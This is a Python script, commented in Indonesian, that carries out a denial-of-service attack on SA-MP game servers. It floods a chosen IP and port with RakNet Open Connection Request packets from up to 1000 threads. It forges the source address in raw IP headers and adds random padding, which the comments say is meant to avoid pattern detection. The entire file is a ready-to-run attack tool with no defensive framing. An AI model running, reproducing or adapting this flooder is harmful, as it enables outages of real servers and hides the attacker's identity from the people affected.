#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SA-MP Ultimate DoS - Connection Flood Edition
Fokus: RakNet Open Connection Request 1 (0x05)
Dengan IP Spoofing dan Multi-Threading Ekstrem
"""

import socket
import struct
import random
import threading
import time
import sys
import os
import signal

# ==================== KONFIGURASI ====================
TARGET_IP = input("Target IP: ")
TARGET_PORT = int(input("Target Port (default 7777): ") or 7777)
THREADS = int(input("Jumlah thread (default 1000): ") or 1000)
DURATION = int(input("Durasi serangan (detik, 0 = infinite): ") or 0)

# Magic Cookie untuk Open Connection Request 1
MAGIC = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'

def random_ip():
    """Generate random source IP"""
    return ".".join(str(random.randint(1,254)) for _ in range(4))

def build_connection_packet(src_ip):
    """Buat paket Open Connection Request 1 dengan IP palsu"""
    # RakNet Open Connection Request 1 (ID 0x05)
    payload = b'\x05' + MAGIC + b'\x00\x00\x00\x00'  # MTU default
    # Tambahkan random padding (agar tidak terdeteksi pola)
    payload += os.urandom(random.randint(32, 256))
    
    # Buat IP header palsu
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            0x45, 0, len(payload)+20, 0, 64, 0, 255, 0,
                            socket.inet_aton(src_ip),
                            socket.inet_aton(TARGET_IP))
    return ip_header + payload

# ==================== FLOOD ENGINE ====================
stop_flag = False
sent_counter = 0
counter_lock = threading.Lock()

def update_sent():
    global sent_counter
    with counter_lock:
        sent_counter += 1

def flood_worker():
    """Worker thread mengirim paket spoofed"""
    # Raw socket membutuhkan root
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    end = time.time() + DURATION if DURATION > 0 else float('inf')
    while not stop_flag and time.time() < end:
        src_ip = random_ip()
        packet = build_connection_packet(src_ip)
        try:
            sock.sendto(packet, (TARGET_IP, 0))  # port diabaikan karena IP header sudah tentukan
            update_sent()
        except:
            pass

def stats_printer():
    """Menampilkan statistik serangan setiap detik"""
    start = time.time()
    last = 0
    while not stop_flag:
        time.sleep(1)
        elapsed = time.time() - start
        current = sent_counter
        rate = current - last
        total_rate = current / elapsed if elapsed > 0 else 0
        print(f"\r\033[32m[+] Packets: {current:,} | Rate: {rate:,}/s | Avg: {total_rate:,.0f}/s\033[0m", end='')
        last = current

def main():
    global stop_flag
    print(f"\n\033[31m[!] Menyerang {TARGET_IP}:{TARGET_PORT} dengan Connection Flood\033[0m")
    print(f"[+] Threads: {THREADS}")
    print(f"[+] Durasi: {'Tak terbatas' if DURATION == 0 else f'{DURATION} detik'}")
    print("[+] Mode: IP Spoofing (raw socket) aktif")
    print("\n[+] Tekan Ctrl+C untuk menghentikan.\n")
    
    # Mulai worker threads
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=flood_worker, daemon=True)
        t.start()
        threads.append(t)
        # Stagger agar tidak overload CPU di awal
        time.sleep(0.001)
    
    # Mulai thread statistik
    stat_thread = threading.Thread(target=stats_printer, daemon=True)
    stat_thread.start()
    
    # Tunggu hingga selesai
    try:
        if DURATION > 0:
            time.sleep(DURATION)
            stop_flag = True
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[31m[!] Dihentikan manual.\033[0m")
        stop_flag = True
    
    # Tunggu thread selesai
    for t in threads:
        t.join(timeout=1)
    
    print(f"\n\033[31m[+] Serangan selesai. Total paket: {sent_counter:,}\033[0m")

if __name__ == "__main__":
    try:
        # Cek apakah root (untuk raw socket)
        if os.geteuid() != 0:
            print("[!] Script ini harus dijalankan sebagai root (sudo) agar spoofing berfungsi.")
            sys.exit(1)
        main()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)
